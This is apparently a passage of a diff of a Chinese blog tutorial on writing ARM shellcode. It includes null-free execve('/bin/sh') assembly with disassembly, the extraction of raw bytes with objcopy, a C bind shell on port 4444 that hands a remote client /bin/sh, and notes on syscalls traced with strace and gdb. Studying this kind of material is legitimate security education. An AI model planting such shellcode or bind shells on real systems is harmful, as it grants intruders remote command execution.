class=&#34;number&#34;&gt;#1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;bx&lt;/span&gt;  &lt;span class=&#34;built_in&#34;&gt;r3&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;meta&#34;&gt;.code&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;add&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;r0&lt;/span&gt;, &lt;span class=&#34;built_in&#34;&gt;pc&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;#8&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;eor&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;r1&lt;/span&gt;, &lt;span class=&#34;built_in&#34;&gt;r1&lt;/span&gt;, &lt;span class=&#34;built_in&#34;&gt;r1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;eor&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;r2&lt;/span&gt;, &lt;span class=&#34;built_in&#34;&gt;r2&lt;/span&gt;, &lt;span class=&#34;built_in&#34;&gt;r2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;r7&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;#11&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;svc&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;#1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;r5&lt;/span&gt;, &lt;span class=&#34;built_in&#34;&gt;r5&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;symbol&#34;&gt;.ascii&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;/bin/sh\0&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-
-&lt;p&gt;去空后，效果还是不错的。&lt;/p&gt;
-&lt;figure class=&#34;highlight arm&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;10054&lt;/span&gt;: e28f3001  &lt;span class=&#34;keyword&#34;&gt;add&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;r3&lt;/span&gt;, &lt;span class=&#34;built_in&#34;&gt;pc&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;#1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;10058&lt;/span&gt;: e12fff13  &lt;span class=&#34;keyword&#34;&gt;bx&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;r3&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;1005&lt;/span&gt;c: a002       &lt;span class=&#34;keyword&#34;&gt;add&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;r0&lt;/span&gt;, &lt;span class=&#34;built_in&#34;&gt;pc&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;#8&lt;/span&gt; &lt;span class=&#34;comment&#34;&gt;; (adr r0, 10068 &amp;lt;_start+0x14&amp;gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;1005&lt;/span&gt;e: &lt;span class=&#34;number&#34;&gt;4049&lt;/span&gt;       &lt;span class=&#34;keyword&#34;&gt;eors&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;r1&lt;/span&gt;, &lt;span class=&#34;built_in&#34;&gt;r1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;10060&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;4052&lt;/span&gt;       &lt;span class=&#34;keyword&#34;&gt;eors&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;r2&lt;/span&gt;, &lt;span class=&#34;built_in&#34;&gt;r2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;10062&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;270&lt;/span&gt;b       &lt;span class=&#34;keyword&#34;&gt;movs&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;r7&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;#11&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;10064&lt;/span&gt;: df01       &lt;span class=&#34;keyword&#34;&gt;svc&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;10066&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;c2d       &lt;span class=&#34;keyword&#34;&gt;adds&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;r5&lt;/span&gt;, &lt;span class=&#34;built_in&#34;&gt;r5&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;#0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;10068&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;e69622f  &lt;span class=&#34;meta&#34;&gt;.word&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x6e69622f&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;1006&lt;/span&gt;c: &lt;span class=&#34;number&#34;&gt;0068732&lt;/span&gt;f  &lt;span class=&#34;meta&#34;&gt;.word&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x0068732f&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-
-&lt;p&gt;提取shellcode：&lt;/p&gt;
-&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;objcopy -O binary execve3 execve3.bin &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-
-&lt;h2 id=&#34;bind-shell-to-tcp&#34;&gt;&lt;a href=&#34;#bind-shell-to-tcp&#34; class=&#34;headerlink&#34; title=&#34;bind shell to tcp&#34;&gt;&lt;/a&gt;bind shell to tcp&lt;/h2&gt;&lt;p&gt;过程：&lt;/p&gt;
-&lt;p&gt;创建新的TCP套接字&lt;br&gt;绑定socket到本地端口&lt;br&gt;等待传入的连接&lt;br&gt;接受传入的连接&lt;br&gt;将STDIN STDOUT STDERR从客户端重定向到新创建的套接字&lt;br&gt;生成shell&lt;/p&gt;
-&lt;figure class=&#34;highlight c++&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;meta-keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;meta-string&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt; &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;meta-keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;meta-string&#34;&gt;&amp;lt;sys/types.h&amp;gt;&lt;/span&gt;  &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;meta-keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;meta-string&#34;&gt;&amp;lt;sys/socket.h&amp;gt;&lt;/span&gt; &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;meta-keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;meta-string&#34;&gt;&amp;lt;netinet/in.h&amp;gt;&lt;/span&gt; &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;int&lt;/span&gt; host_sockid;    &lt;span class=&#34;comment&#34;&gt;// socket file descriptor &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;int&lt;/span&gt; client_sockid;  &lt;span class=&#34;comment&#34;&gt;// client file descriptor &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;sockaddr_in&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;hostaddr&lt;/span&gt;;&lt;/span&gt;            &lt;span class=&#34;comment&#34;&gt;// server aka listen address&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt; &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;/span&gt;&amp;#123; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;// Create new TCP socket &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    host_sockid = &lt;span class=&#34;built_in&#34;&gt;socket&lt;/span&gt;(PF_INET, SOCK_STREAM, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;); &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;// Initialize sockaddr struct to bind socket using it &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    hostaddr.sin_family = AF_INET;                  &lt;span class=&#34;comment&#34;&gt;// server socket type address family = internet protocol address&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    hostaddr.sin_port = &lt;span class=&#34;built_in&#34;&gt;htons&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;4444&lt;/span&gt;);                &lt;span class=&#34;comment&#34;&gt;// server port, converted to network byte order&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    hostaddr.sin_addr.s_addr = &lt;span class=&#34;built_in&#34;&gt;htonl&lt;/span&gt;(INADDR_ANY);   &lt;span class=&#34;comment&#34;&gt;// listen to any address, converted to network byte order&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;// Bind socket to IP/Port in sockaddr struct &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;bind&lt;/span&gt;(host_sockid, (struct sockaddr*) &amp;amp;hostaddr, &lt;span class=&#34;built_in&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;sizeof&lt;/span&gt;&lt;/span&gt;(hostaddr)); &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;// Listen for incoming connections &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;listen&lt;/span&gt;(host_sockid, &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;); &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;// Accept incoming connection &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    client_sockid = &lt;span class=&#34;built_in&#34;&gt;accept&lt;/span&gt;(host_sockid, &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;, &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;); &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;// Duplicate file descriptors for STDIN, STDOUT and STDERR &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;dup2&lt;/span&gt;(client_sockid, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;); &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;dup2&lt;/span&gt;(client_sockid, &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;); &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;dup2&lt;/span&gt;(client_sockid, &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;); &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;// Execute /bin/sh &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;execve&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;, &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;, &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;); &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;close&lt;/span&gt;(host_sockid); &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-
-&lt;table&gt;
-&lt;thead&gt;
-&lt;tr&gt;
-&lt;th&gt;Function&lt;/th&gt;
-&lt;th&gt;R7&lt;/th&gt;
-&lt;th&gt;R0&lt;/th&gt;
-&lt;th&gt;R1&lt;/th&gt;
-<p>
-		
-
-	
-
-	</div>
-  <a type="button" href="/2021/08/16/ARM Shellcode的编写/#more" class="btn btn-default more">Read More</a>
-</div>
-
--->
-<div class="entry">
-  <div class="row">
-	
-	
-		<h2 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h2><p>从write说起：</p>
-<p>在linux中的原型为：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">write</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">const</span> <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> count)</span></span>;</span><br></pre></td></tr></table></figure>
-
-<p>在c语言中的使用方法如下：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> <span class="built_in">string</span>[<span class="number">13</span>] = <span class="string">&quot;Hello world\n&quot;</span>;</span><br><span class="line">write(<span class="number">1</span>, <span class="built_in">string</span>, <span class="keyword">sizeof</span>(<span class="built_in">string</span>));        <span class="comment">// Here sizeof(string) is 13</span></span><br></pre></td></tr></table></figure>
-
-<p>把write的系统调用的汇编代码提取出来。如下：</p>
-<figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">   <span class="number">0x000270b0</span> &lt;+<span class="number">0</span>&gt;: <span class="keyword">ldr</span> <span class="built_in">r12</span>, [<span class="built_in">pc</span>, <span class="number">#96</span>] <span class="comment">; 0x27118</span></span><br><span class="line">   <span class="number">0x000270b4</span> &lt;+<span class="number">4</span>&gt;: <span class="keyword">ldr</span> <span class="built_in">r12</span>, [<span class="built_in">pc</span>, <span class="built_in">r12</span>]</span><br><span class="line">=&gt; <span class="number">0x000270b8</span> &lt;+<span class="number">8</span>&gt;: <span class="keyword">teq</span> <span class="built_in">r12</span>, <span class="number">#0</span></span><br><span class="line">   <span class="number">0x000270bc</span> &lt;+<span class="number">12</span>&gt;: <span class="keyword">push</span> &#123;<span class="built_in">r7</span>&#125;  <span class="comment">; (str r7, [sp, #-4]!)</span></span><br><span class="line">   <span class="number">0x000270c0</span> &lt;+<span class="number">16</span>&gt;: <span class="keyword">bne</span> <span class="number">0x270dc</span> &lt;write+<span class="number">44</span>&gt;</span><br><span class="line">   <span class="number">0x000270c4</span> &lt;+<span class="number">20</span>&gt;: <span class="keyword">mov</span> <span class="built_in">r7</span>, <span class="number">#4</span></span><br><span class="line">   <span class="number">0x000270c8</span> &lt;+<span class="number">24</span>&gt;: <span class="keyword">svc</span> <span class="number">0x00000000</span></span><br></pre></td></tr></table></figure>
-
-<p>fd, buf, count 分别保存在r0,r1,r2中，r7 存放着系统调用号，代表着write这个系统调用。</p>
-<p>fd – 1 for STDOUT<br>buf – pointer to a string<br>count – number of bytes to write -&gt; 13<br>syscall number of write -&gt; 0x4</p>
-<p>直接使用系统调用的方式：</p>
-<figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mov</span>   <span class="built_in">r0</span>, <span class="number">#1</span>      <span class="comment">@ fd 1 = STDOUT</span></span><br><span class="line"><span class="keyword">ldr</span>   <span class="built_in">r1</span>, string  <span class="comment">@ loading the string from memory to R1</span></span><br><span class="line"><span class="keyword">mov</span>   <span class="built_in">r2</span>, <span class="number">#13</span>     <span class="comment">@ write 13 bytes to STDOUT </span></span><br><span class="line"><span class="keyword">mov</span>   <span class="built_in">r7</span>, <span class="number">#4</span>      <span class="comment">@ Syscall 0x4 = write()</span></span><br><span class="line"><span class="keyword">svc</span>   <span class="number">#0</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="1-trace-system-call"><a href="#1-trace-system-call" class="headerlink" title="1.trace system call"></a>1.trace system call</h3><p>使用下面的简单例程，然后把它转化成汇编代码：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">strace -f -v &lt;filename&gt;</span><br><span class="line"></span><br><span class="line">execve(&quot;/usr/bin/test&quot;, [&quot;test&quot;], [...]) = 0</span><br></pre></td></tr></table></figure>
-
-<h3 id="2-system-call-number-and-parameters"><a href="#2-system-call-number-and-parameters" class="headerlink" title="2.system call number and parameters"></a>2.system call number and parameters</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">NAME</span><br><span class="line">    execve - execute program</span><br><span class="line">SYNOPSIS</span><br><span class="line"></span><br><span class="line">    <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">int</span>  <span class="title">execve</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *filename, <span class="keyword">char</span> *<span class="keyword">const</span> argv [], <span class="keyword">char</span> *<span class="keyword">const</span> envp[])</span></span>;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">=&gt; <span class="number">0x000264d0</span> &lt;+<span class="number">0</span>&gt;: <span class="keyword">push</span> &#123;<span class="built_in">r7</span>, <span class="built_in">lr</span>&#125;</span><br><span class="line">   <span class="number">0x000264d4</span> &lt;+<span class="number">4</span>&gt;: <span class="keyword">mov</span> <span class="built_in">r7</span>, <span class="number">#11</span></span><br><span class="line">   <span class="number">0x000264d8</span> &lt;+<span class="number">8</span>&gt;: <span class="keyword">svc</span> <span class="number">0x00000000</span></span><br><span class="line">   <span class="number">0x000264dc</span> &lt;+<span class="number">12</span>&gt;: <span class="keyword">cmn</span> <span class="built_in">r0</span>, <span class="number">#4096</span> <span class="comment">; 0x1000</span></span><br><span class="line">   <span class="number">0x000264e0</span> &lt;+<span class="number">16</span>&gt;: <span class="keyword">mov</span> <span class="built_in">r3</span>, <span class="built_in">r0</span></span><br><span class="line">   <span class="number">0x000264e4</span> &lt;+<span class="number">20</span>&gt;: <span class="keyword">bhi</span> <span class="number">0x264f0</span> &lt;execve+<span class="number">32</span>&gt;</span><br><span class="line">   <span class="number">0x000264e8</span> &lt;+<span class="number">24</span>&gt;: <span class="keyword">mov</span> <span class="built_in">r0</span>, <span class="built_in">r3</span></span><br><span class="line">   <span class="number">0x000264ec</span> &lt;+<span class="number">28</span>&gt;: <span class="keyword">pop</span> &#123;<span class="built_in">r7</span>, <span class="built_in">pc</span>&#125;</span><br><span class="line">   <span class="number">0x000264f0</span> &lt;+<span class="number">32</span>&gt;: <span class="keyword">ldr</span> <span class="built_in">r2</span>, [<span class="built_in">pc</span>, <span class="number">#20</span>] <span class="comment">; 0x2650c &lt;execve+60&gt;</span></span><br><span class="line">   <span class="number">0x000264f4</span> &lt;+<span class="number">36</span>&gt;: <span class="keyword">rsb</span> <span class="built_in">r1</span>, <span class="built_in">r0</span>, <span class="number">#0</span></span><br><span class="line">   <span class="number">0x000264f8</span> &lt;+<span class="number">40</span>&gt;: <span class="keyword">ldr</span> <span class="built_in">r2</span>, [<span class="built_in">pc</span>, <span class="built_in">r2</span>]</span><br><span 